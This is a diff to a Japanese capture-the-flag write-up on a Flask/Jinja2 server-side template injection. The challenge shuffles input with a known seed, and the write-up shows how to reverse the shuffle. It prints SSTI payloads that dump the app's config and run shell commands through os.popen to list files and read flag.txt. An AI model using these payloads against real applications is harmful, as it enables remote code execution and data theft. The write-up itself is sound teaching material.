@@ -223,7 +223,7 @@ def style():
 ```
 
 ソースコードから、`/shout`の入力した文字列がランダムな順序で表示される部分に変数などを出力させることができることがわかる。  
-例えば`{{config}}`で設定情報を出力させられる。  
+例えば`{​{config}}`で設定情報を出力させられる。  
 入力した文字列はランダムな順序で出力されるが、`random.seed(0)`でシード値がわかっているため  
 出力したい文字列から必要な入力を逆算することができる。  
 
@@ -246,31 +246,31 @@ def unshuffle_with_seed(shuffled_ls, seed):
   return [a for (a, b) in ls]
 ```
 
-`gcinfo}{​{}`と入力すると`{{config}}`と出力される。
+`gcinfo}{​{}`と入力すると`{​{config}}`と出力される。
 
 <img src="./img/angstrom/winds3.png">
 
-`{{config}}`ではflagに関する情報はなかった。
+`{​{config}}`ではflagに関する情報はなかった。
 
 リモートコード実行を試してみる。とりあえずlsしてみる。
 
 ```
-{{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}
+{​{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}
 ```
 になるように、以下を入力。
 ```
-iispb)t{{paus(_iol(qsl)n_.ehtr_tl(c_-irn'tooe)_.a}peb}_lm.sip.a_ad_.'poge_' u's_l.la_r_on
+iispb)t{​{paus(_iol(qsl)n_.ehtr_tl(c_-irn'tooe)_.a}peb}_lm.sip.a_ad_.'poge_' u's_l.la_r_on
 ```
 
 <img src="./img/angstrom/winds5.png">
 
 同じディレクトリ内に`flag.txt`があることがわかったので、中身を表示する。
 ```
-{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+{​{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
 ```
 になるように、以下を入力。
 ```
-_ir'i)i{{cnua.isot tn__taopt)le_l(__.artos'uo)rep}me.}.psqbl(.a_xd'pf_ibn.'taallgg_pe.c(__sto_
+_ir'i)i{​{cnua.isot tn__taopt)le_l(__.artos'uo)rep}me.}.psqbl(.a_xd'pf_ibn.'taallgg_pe.c(__sto_
 ```
 
 flagが得られた。
